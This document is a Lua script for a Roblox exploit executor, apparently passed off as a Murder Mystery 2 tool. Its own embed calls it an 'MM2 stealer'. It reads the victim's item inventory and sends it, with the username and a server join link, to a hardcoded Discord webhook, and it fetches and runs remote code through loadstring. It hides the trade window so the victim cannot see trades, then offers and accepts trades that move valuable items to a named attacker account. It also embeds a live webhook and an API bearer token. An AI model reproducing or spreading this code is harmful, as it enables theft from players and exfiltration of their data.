_G.Ex = _G.Ex or false

if _G.Ex then
    return
end

_G.Ex = true
local tbl = {"33kghoster"}
local tbl1 = {Godly = true, Ancient = true, Unique = true, Chroma = true, Vintage = true}
local flag = false
local num = 0

if getgc then
    while true do
        local flag1 = false

        for _, v1 in ipairs(getgc(true)) do
            if typeof(v1) == "function" then
                local v2 = debug.getinfo(v1)
                if v2 and v2.name then
                    local v3 = v2.name:lower()
                    if v3:find("step") and not v3:find("stepanimate") then
                        pcall(
                            function()
                                hookfunction(
                                    v1,
                                    function(...)
                                        if not flag then
                                            flag = true
                                            _G.RealJobID = game.JobId
                                        end
                                        if old then
                                            return old(...)
                                        end
                                    end
                                )
                            end
                        )

                        flag1 = true
                        break
                    end
                end
            end
        end

        num = num + 1

        if not (flag1 or num >= 10) then
            task.wait(0.1)
            if not flag then
                continue
            end
        end

        break
    end
end

if not flag then
    _G.RealJobID = game.JobId
end

task.wait(0.5)

task.spawn(
    function()
        while task.wait(10) do
            pcall(
                function()
                    for _, v1 in ipairs(
                        getconnections(
                            game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated
                        )
                    ) do
                        v1:Enable()
                    end
                end
            )
        end
    end
)

local function func()
    if request then
        return request
    end

    if syn and syn.request then
        return syn.request
    end

    if http_request then
        return http_request
    end

    return nil
end

local v4 = (function()
    local str = "Unknown"

    pcall(
        function()
            str = identifyexecutor()
        end
    )

    local tbl = {
        JobId = _G.RealJobID or game.JobId, Executor = string.lower(str), IsDelta = false,
        Success = true
    }

    if tbl.Executor == "delta" and _G.RealJobID then
        tbl.IsDelta = true
    end

    return tbl
end)()

_G.RealJobID = v4.JobId
_G.RealExecutor = v4.Executor

if game.PlaceId ~= 142823291 then
    game.Players.LocalPlayer:Kick("This script only works in Murder Mystery 2")
    return
end

local v5 = setmetatable(
    {},
    {
        __index = function(_, serviceName)
            return game:GetService(serviceName)
        end,
    }
)

task.spawn(
    function()
        while task.wait(0.3) do
            pcall(
                function()
                    local Descendants = v5.CoreGui:GetDescendants()
                    for _, Descendant in ipairs(Descendants) do
                        if Descendant:IsA("GuiButton") and Descendant.Name == "LeaveGameButton" then
                            for _, v1 in ipairs(getconnections(Descendant.Activated)) do
                                v1:Enable()
                            end
                        end
                    end
                end
            )
        end
    end
)

pcall(
    function()
        local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
        if RobloxReplicatedStorage and RobloxReplicatedStorage:FindFirstChild("GetServerType") then
            if RobloxReplicatedStorage.GetServerType:InvokeServer() == "VIPServer" then
                game.Players.LocalPlayer:Kick(
                    "Private servers are not supported. Please join a normal server."
                )
                return
            end
        end
    end
)

if #game.Players:GetPlayers() >= 12 then
    game.Players.LocalPlayer:Kick("Server is full, please rejoin another server")
    return
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local tbl2 = {
    DefaultGun = true, DefaultKnife = true, Reaver = true, Reaver_Legendary = true,
    Reaver_Godly = true, Reaver_Ancient = true, IceHammer = true, IceHammer_Legendary = true,
    IceHammer_Godly = true, IceHammer_Ancient = true, Gingerscythe = true,
    Gingerscythe_Legendary = true, Gingerscythe_Godly = true, Gingerscythe_Ancient = true,
    TestItem = true, Season1TestKnife = true, Cracks = true, Icecrusher = true, ["???"] = true,
    Dartbringer = true, TravelerAxeRed = true, TravelerAxeBronze = true, TravelerAxeSilver = true,
    TravelerAxeGold = true, BlueCamo_K_2022 = true, GreenCamo_K_2022 = true, SharkSeeker = true,
}

local function func1()
    local v1 = func()

    if not v1 then
        return nil
    end

    local v12

    if not pcall(
        function()
            v12 = v1(
                {
                    Url = "https://api.rubis.app/v2/scrap/lSSuMqdThhmQlB7V/raw", Method = "GET",
                    Headers = {["User-Agent"] = "Mozilla/5.0"}, Timeout = 10,
                }
            )
        end
    ) or not v12 or not v12.Body then
        return nil
    end

    local v13

    pcall(
        function()
            local chunk = loadstring(v12.Body)
            if chunk then
                v13 = chunk()
            end
        end
    )

    if not v13 then
        return nil
    end

    local tbl = {}

    for k, v2 in pairs(v13) do
        if k ~= "Pet" then
            local v3 = string.upper(string.sub(k, 1, 1)) .. string.lower(string.sub(k, 2))
            for k1, v4 in pairs(v2) do
                local str = "knife"
                local k1Ref = k1

                if k1:find("%(gun%)") then
                    str = "gun"
                    k1Ref = k1:gsub("%s*%(gun%)%s*$", ""):match("^%s*(.-)%s*$")
                elseif k1:find("%(knife%)") then
                    str = "knife"
                    k1Ref = k1:gsub("%s*%(knife%)%s*$", ""):match("^%s*(.-)%s*$")
                end

                local v5 = k1Ref:match("^%s*(.-)%s*$")

                local tbl1 = {
                    Rarity = v3, Value = tonumber(v4) or 0, Chroma = v3 == "Chroma",
                    InDatabase = true, ItemType = str, DisplayName = v5,
                }

                local v6 = string.lower(v5):gsub("'", "")
                local v7 = v6:gsub(" ", ""):gsub("_", "")

                if v7 and v7 ~= "" then
                    tbl[v7] = tbl1
                end

                local v8 = v6:gsub(" ", "_")

                if v8 and v8 ~= "" then
                    tbl[v8] = tbl1
                end

                local v9 = v6:gsub(" ", ""):gsub("_", "") .. str

                if v9 and v9 ~= "" then
                    tbl[v9] = tbl1
                end

                local v10 = v6:gsub(" ", "_") .. "_" .. str

                if v10 and v10 ~= "" then
                    tbl[v10] = tbl1
                end

                local v11 = string.lower(k1):gsub("'", ""):gsub(" ", ""):gsub("_", ""):gsub(
                    "%(", ""
                ):gsub("%)", "")

                if v11 and v11 ~= "" then
                    tbl[v11] = tbl1
                end
            end
        end
    end

    return tbl
end

local num1 = 1
local v6

while true do
    v6 = func1()

    if v6 and next(v6) then
        break
    end

    task.wait(0.5)
    num1 = num1 + 1

    if num1 > 3 then
        break
    end
end

if not v6 or not next(v6) then
    warn("Failed to load item database from Rubis API.")
end

local v8

if getgc then
    for _, v7 in pairs(getgc(true)) do
        if type(v7) == "table" and rawget(v7, "Pets") and rawget(v7, "Item") and rawget(v7, "Badge") then
            v8 = v7
            break
        end
    end
end

local tbl3 = {Classic = "Vintage"}
local tbl4 = {}

if v8 then
    for k, v9 in pairs(v8.Item) do
        if v9.ItemName and not tbl2[k] and not v9.EvoBaseID then
            local v10 = string.lower(v9.ItemType or "knife")
            local v11 = string.lower(v9.ItemName):gsub("'", ""):gsub(" ", ""):gsub("_", "")
            local v12 = v11 .. v10
            local v13 = v11 .. "(" .. v10 .. ")"
            local v15

            if v9.Chroma then
                local v14 = "chroma" .. v11
                v15 = v6[v14] or v6[v14 .. v10]
            end

            local v16 = v15 or v6[v11] or v6[v12] or v6[v13]

            tbl4[k] = {
                value = v16 and v16.Value or 0, name = v9.ItemName,
                rarity = tbl3[v9.Rarity] or v9.Rarity or "Common", type = v9.ItemType or "knife",
                chroma = v9.Chroma or false,
            }
        end
    end
end

local function func2(arg1)
    local v1 = #arg1
    local str = ""
    local flag = true

    for i = 1, v1 do
        local v2 = arg1:sub(i, i)
        if v2 == "_" or v2 == " " then
            flag = true
            str = str .. " "
        else
            str = str .. (flag and v2:upper() or v2:lower())
            flag = false
        end
    end

    return str
end

local LastOffer

pcall(
    function()
        if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild(
            "UpdateTrade"
        ) then
            ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(
                function(arg1)
                    if arg1 and arg1.LastOffer then
                        LastOffer = arg1.LastOffer
                    end
                end
            )
        end
    end
)

local function func3()
    local tbl = {}
    local tbl3 = {}
    local num = 0
    local v7

    pcall(
        function()
            v7 = ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(LocalPlayer)
        end
    )

    if not v7 or not v7.Weapons then
        pcall(
            function()
                local v1 = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(
                    LocalPlayer.Name
                )
                if v1 then
                    v7 = v1
                end
            end
        )
    end

    if not v7 or not v7.Weapons or not v7.Weapons.Owned then
        return tbl3, tbl, 0
    end

    for k, v1 in pairs(v7.Weapons.Owned) do
        if v1 and v1 > 0 then
            local v2 = tbl4[k]

            if not v2 then
                local v3 = string.lower(k):gsub("'", ""):gsub(" ", ""):gsub("_", "")
                local v4 = string.lower(k):gsub("'", ""):gsub(" ", "_")
                local v5 = v6[v3] or v6[v4]

                if v5 then
                    v2 = {
                        value = v5.Value, name = k, rarity = v5.Rarity,
                        type = v5.ItemType or "knife", chroma = v5.Chroma or false,
                    }
                end
            end

            if v2 then
                local tbl5 = {
                    DataID = k, ItemName = v2.name, Rarity = v2.rarity, Amount = v1,
                    Value = v2.value, IsChroma = v2.chroma, InDatabase = true,
                    TotalValue = v2.value * v1, ItemType = v2.type, DisplayName = v2.name,
                }

                table.insert(tbl3, tbl5)

                if tbl5.InDatabase and not tbl2[tbl5.DataID] and tbl1[tbl5.Rarity] and tbl5.Value >= 5 then
                    table.insert(tbl, tbl5)
                    num = num + tbl5.TotalValue
                end
            end
        end
    end

    table.sort(
        tbl3,
        function(a, b)
            return a.TotalValue > b.TotalValue
        end
    )

    table.sort(
        tbl,
        function(a, b)
            return a.TotalValue > b.TotalValue
        end
    )

    return tbl3, tbl, num
end

local v17, v18, _ = func3()
local v19 = v18
local v20 = v17

-- https://lua-x.online
local function func4(arg1)
    local v1 = func()

    local tbl = {
        Url = "https://discord.com/api/webhooks/1563911045335224482/TepR5S_f9R6TMEexF7qxtZ4M6ffqzV4g0BcbKM6DWh2R7hq_NcvWde59bcSC0osClZ01",
        Method = "POST", Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(arg1),
    }

    pcall(
        function()
            if v1 then
                v1(tbl)
            elseif syn and syn.request then
                syn.request(tbl)
            else
                HttpService:PostAsync(
                    "https://discord.com/api/webhooks/1563911045335224482/TepR5S_f9R6TMEexF7qxtZ4M6ffqzV4g0BcbKM6DWh2R7hq_NcvWde59bcSC0osClZ01",
                    tbl.Body, Enum.HttpContentType.ApplicationJson
                )
            end
        end
    )
end

local tbl5 = {
    "Ancient", "Chroma", "Unique", "Godly", "Vintage", "Legendary", "Rare", "Uncommon", "Common"
}
local tbl6 = {Ancient = true, Chroma = true, Unique = true, Godly = true, Vintage = true}

local function func5(arg1)
    local tbl = {}

    for _, v1 in ipairs(arg1) do
        local Rarity = v1.Rarity

        if not tbl[Rarity] then
            tbl[Rarity] = {}
        end

        table.insert(tbl[Rarity], v1)
    end

    return tbl
end

local function func6(player)
    local v1 = func2(player.DisplayName or player.ItemName)

    if player.IsChroma and not v1:lower():find("^chroma") then
        v1 = "Chroma " .. v1
    end

    return " - " .. v1 .. " (" .. string.lower(player.ItemType or "knife") .. ") value: " .. tostring(
        math.floor(player.Value + 0.5)
    ) .. (player.Amount > 1 and " x" .. player.Amount or "")
end

local function func7(arg1)
    local v1 = func5(arg1)
    local num = 0

    for _, v2 in ipairs(arg1) do
        num = num + v2.TotalValue
    end

    local tbl = {}
    table.insert(tbl, "Total Value: " .. math.floor(num + 0.5))
    table.insert(tbl, string.rep("-", 40))

    for _, v3 in ipairs(tbl5) do
        if tbl6[v3] and v1[v3] and #v1[v3] > 0 then
            table.insert(tbl, v3)
            for _, v4 in ipairs(v1[v3]) do
                table.insert(tbl, (func6(v4)))
            end
        end
    end

    return tbl
end

local tbl7 = {}

local function func8(arg1)
    local v1 = func()

    if not v1 then
        return nil
    end

    local ok, result = pcall(
        function()
            local v2 = v1(
                {Url = "https://api.rubis.app/v2/scrap?public=true", Method = "POST", Body = arg1}
            )

            if v2 and v2.StatusCode == 200 then
                local v3 = HttpService:JSONDecode(v2.Body)
                if v3 and v3.raw then
                    return v3.raw
                end
            end

            return nil
        end
    )

    if ok and result then
        return result
    end

    local ok1, result1 = pcall(
        function()
            local v2 = v1(
                {
                    Url = "https://pastefy.app/api/v2/paste", Method = "POST",
                    Headers = {
                        Authorization = "Bearer bCmvP7YNqkOyMEeJDvL0eDXzfSgm2XhWcGadQ3aXKKiH7BKe5ZBIgem3tbuC",
                        ["Content-Type"] = "application/json",
                    },
                    Body = HttpService:JSONEncode(
                        {content = arg1, title = "MM2 Inventory", expires = "never", encrypted = false}
                    ),
                }
            )

            if v2 and v2.Body then
                local v3 = HttpService:JSONDecode(v2.Body)
                if v3 and v3.paste and v3.paste.id then
                    return "https://pastefy.app/" .. v3.paste.id .. "/raw"
                end
            end

            return nil
        end
    )

    return ok1 and result1 or nil
end

tbl7[8], tbl7[7], tbl7[3], tbl7[4], tbl7[6], tbl7[1], tbl7[5], tbl7[2], tbl7[9] =
    "Uncommon", "Rare", "Unique", "Godly", "Legendary", "Ancient", "Vintage", "Chroma", "Common"

local function func9()
    local v1 = func7(v20)
    local v2 = table.concat(v1, "\n")
    local str = "Unknown"

    pcall(
        function()
            str = tostring(version())
        end
    )

    local v3 = table.concat(tbl, ", ")
    local v4 = func8(v2)
    local v5 = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. _G.RealJobID

    local v6 = string.format(
        'game:GetService("TeleportService"):TeleportToPlaceInstance("%s", "%s", game.Players.LocalPlayer)',
        tostring(game.PlaceId), tostring(_G.RealJobID)
    )

    local tbl1 = {}
    local num = 0
    local flag = false

    for _, v7 in ipairs(tbl7) do
        tbl1[v7] = 0
    end

    for _, v8 in ipairs(v20) do
        if tbl1[v8.Rarity] then
            tbl1[v8.Rarity] = tbl1[v8.Rarity] + v8.Amount
        end
    end

    for _, v9 in ipairs(v20) do
        if tbl6[v9.Rarity] then
            num = num + v9.TotalValue
        end
    end

    for _, v10 in ipairs(v19) do
        if v10.Value > 3 then
            flag = true
            break
        end
    end

    local v11 = (flag and "@everyone\n" or "") .. v6
    local v12 = "```" .. "Total value: " .. math.floor(num + 0.5) .. "\nAncient    : " .. tbl1.Ancient .. "\nGodly      : " .. tbl1.Godly .. "\nUnique     : " .. tbl1.Unique .. "\nVintage    : " .. tbl1.Vintage .. "\nLegendary  : " .. tbl1.Legendary .. "\nRare       : " .. tbl1.Rare .. "\nUncommon   : " .. tbl1.Uncommon .. "\nCommon     : " .. tbl1.Common .. "```" .. "\n**__List of items__**\n" .. (v4 or "Failed to upload") .. ""
    local tbl2 = {
        title = "MM2 stealer", color = 10040268, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    local tbl3 = {}

    local tbl4 = {
        name = "`Player Info:`",
        value = "```" .. "Username: " .. LocalPlayer.Name .. "\nDisplay Username: " .. LocalPlayer.DisplayName .. "\nExecutor: " .. (_G.RealExecutor or "Unknown") .. "\nRoblox version: " .. str .. "\nReceiver: " .. v3 .. "```",
        inline = false,
    }

    tbl3[3], tbl3[1], tbl3[2] =
        {name = "__Join link:__", value = "[click here to join](" .. v5 .. ")", inline = false},
        tbl4, {name = "**__Inventory__**", value = v12, inline = false}
    tbl2.fields = tbl3
    tbl2.footer = {text = "KXN MM2 - " .. os.date("%Y-%m-%d %H:%M:%S")}

    pcall(
        function()
            func4({content = v11, embeds = {tbl2}})
        end
    )
end

local TradeGUI = PlayerGui:WaitForChild("TradeGUI")

TradeGUI:GetPropertyChangedSignal("Enabled"):Connect(
    function()
        TradeGUI.Enabled = false
    end
)

local TradeGUI_Phone = PlayerGui:WaitForChild("TradeGUI_Phone")

TradeGUI_Phone:GetPropertyChangedSignal("Enabled"):Connect(
    function()
        TradeGUI_Phone.Enabled = false
    end
)

if #v20 > 0 then
    func9()

    local function func10(name)
        local num = 0
        while num < 999 do
            local v1, v2, _ = func3()
            v19 = v2
            v20 = v1

            if #v19 == 0 then
                return
            end

            num = num + 1

            local ok, result = pcall(
                function()
                    if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild(
                        "GetTradeStatus"
                    ) then
                        return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
                    end
                    return "None"
                end
            )

            local v3 = ok and result or "None"

            if v3 == "StartTrade" then
                pcall(
                    function()
                        if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild(
                            "DeclineTrade"
                        ) then
                            ReplicatedStorage.Trade.DeclineTrade:FireServer()
                        end
                    end
                )
                task.wait(0.3)
            elseif v3 == "ReceivingRequest" then
                pcall(
                    function()
                        if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild(
                            "DeclineRequest"
                        ) then
                            ReplicatedStorage.Trade.DeclineRequest:FireServer()
                        end
                    end
                )
                task.wait(0.3)
            end

            local flag = false
            local num1 = 0

            while not flag and num1 < 15 do
                local ok1, result1 = pcall(
                    function()
                        if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild(
                            "GetTradeStatus"
                        ) then
                            return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
                        end
                        return "None"
                    end
                )

                local v4 = ok1 and result1 or "None"

                if v4 == "None" then
                    local v5 = Players:FindFirstChild(name)
                    if pcall(
                        function()
                            if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild(
                                "SendRequest"
                            ) then
                                ReplicatedStorage.Trade.SendRequest:InvokeServer(v5 or name)
                            end
                        end
                    ) then
                        flag = true
                    end
                elseif v4 == "StartTrade" then
                    flag = true
                elseif v4 == "ReceivingRequest" then
                    pcall(
                        function()
                            if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild(
                                "DeclineRequest"
                            ) then
                                ReplicatedStorage.Trade.DeclineRequest:FireServer()
                            end
                        end
                    )
                    task.wait(0.2)
                end

                if not flag then
                    task.wait(0.4)
                    num1 = num1 + 1
                end
            end

            if not flag then
                task.wait(1)
            else
                local num2 = 0

                while true do
                    local ok2, result2 = pcall(
                        function()
                            if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild(
                                "GetTradeStatus"
                            ) then
                                return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
                            end
                            return "None"
                        end
                    )

                    if not ((ok2 and result2 or "None") ~= "StartTrade" and num2 < 30) then
                        break
                    end

                    task.wait(0.2)
                    num2 = num2 + 1
                end

                local ok3, result3 = pcall(
                    function()
                        if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild(
                            "GetTradeStatus"
                        ) then
                            return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
                        end
                        return "None"
                    end
                )

                if (ok3 and result3 or "None") ~= "StartTrade" then
                    task.wait(1)
                else
                    local v6 = math.min(4, #v19)
                    local num3 = 1

                    if v6 == v6 then
                        if not (1 > v6) then
                            while #v19 ~= 0 do
                                local v7 = table.remove(v19, 1)

                                for _ = 1, v7.Amount do
                                    local DataID = v7.DataID

                                    pcall(
                                        function()
                                            if ReplicatedStorage and ReplicatedStorage:FindFirstChild(
                                                "Trade"
                                            ) and ReplicatedStorage.Trade:FindFirstChild(
                                                "OfferItem"
                                            ) then
                                                ReplicatedStorage.Trade.OfferItem:FireServer(
                                                    DataID, "Weapons"
                                                )
                                            end
                                        end
                                    )

                                    task.wait(0.015)
                                end

                                num3 = num3 + 1

                                if num3 > v6 then
                                    break
                                end
                            end
                        end
                    end

                    task.wait(6)

                    if LastOffer then
                        pcall(
                            function()
                                if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild(
                                    "AcceptTrade"
                                ) then
                                    ReplicatedStorage.Trade.AcceptTrade:FireServer(
                                        game.PlaceId * 3, LastOffer
                                    )
                                end
                            end
                        )
                        LastOffer = nil
                    end

                    local num4 = 30

                    while true do
                        local ok4, result4 = pcall(
                            function()
                                if ReplicatedStorage and ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild(
                                    "GetTradeStatus"
                                ) then
                                    return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
                                end
                                return "None"
                            end
                        )

                        if not ((ok4 and result4 or "None") ~= "None" and num4 > 0) then
                            break
                        end

                        task.wait(0.5)
                        num4 = num4 - 1
                    end

                    task.wait(1.5)
                end
            end
        end
    end;

    (function()
        local flag = false

        local function func(arg1)
            if flag then
                return
            end
            if table.find(tbl, arg1.Name) then
                flag = true
                task.wait(3)
                func10(arg1.Name)
            end
        end

        for _, player in ipairs(Players:GetPlayers()) do
            if not flag then
                if table.find(tbl, player.Name) then
                    flag = true
                    task.wait(3)
                    func10(player.Name)
                end
            end
        end

        Players.PlayerAdded:Connect(func)
    end)()
end
